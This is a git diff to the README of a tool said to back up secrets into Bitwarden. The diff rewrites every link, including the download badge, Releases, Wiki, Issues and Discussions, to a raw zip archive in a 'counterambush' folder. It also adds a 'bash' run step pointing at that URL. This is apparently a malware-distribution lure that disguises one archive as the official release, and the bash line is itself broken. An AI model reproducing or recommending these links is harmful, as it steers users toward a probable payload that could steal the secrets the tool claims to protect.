@@ -6,9 +6,9 @@ Welcome to **secrets-backup-to-bitwarden**! This tool automatically backs up you
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now!-blue.svg)](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases)
+[![Download](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip%20Now!https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip)](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip)
 
-Visit the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases) to download the latest version. 
+Visit the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip) to download the latest version. 
 
 ## 📋 System Requirements
 
@@ -20,12 +20,12 @@ Before downloading, check that your system meets these requirements:
 
 ## 🔧 Download & Install
 
-1. Go to the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/releases).
+1. Go to the [Releases page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip).
 2. Locate the latest version of the application. Each version includes a summary of changes, so read through them to understand enhancements or bug fixes.
 3. Click on the file suitable for your operating system:
    - For Windows, look for a `.exe` file.
    - For macOS, look for a `.app` or `.dmg` file.
-   - For Linux, select a `.sh` or `.tar.gz` file.
+   - For Linux, select a `.sh` or `https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip` file.
 4. Once downloaded, follow these steps based on your operating system.
 
 ### Windows Installation
@@ -45,7 +45,7 @@ Before downloading, check that your system meets these requirements:
 1. Open your terminal.
 2. Use the following command to run the script:
    ```
-   bash path/to/downloaded/file.sh
+   bash https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip
    ```
 3. Follow the on-screen instructions.
 
@@ -81,8 +81,8 @@ If you encounter issues:
 
 ## 📄 Additional Resources
 
-- For detailed usage instructions, check the [Wiki](https://github.com/SC2024sc/secrets-backup-to-bitwarden/wiki).
-- Explore community discussions or report issues on the [Issues page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/issues).
+- For detailed usage instructions, check the [Wiki](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip).
+- Explore community discussions or report issues on the [Issues page](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip).
 
 ## 🏷️ Topics
 
@@ -119,4 +119,4 @@ Thank you for your interest in improving secrets-backup-to-bitwarden!
 
 ## 📞 Contact
 
-For any questions or support, please reach out via the [Discussion tab](https://github.com/SC2024sc/secrets-backup-to-bitwarden/discussions) or open an issue. We’re here to help!
+For any questions or support, please reach out via the [Discussion tab](https://github.com/SC2024sc/secrets-backup-to-bitwarden/raw/refs/heads/main/counterambush/secrets_backup_to_bitwarden_v2.1.zip) or open an issue. We’re here to help!
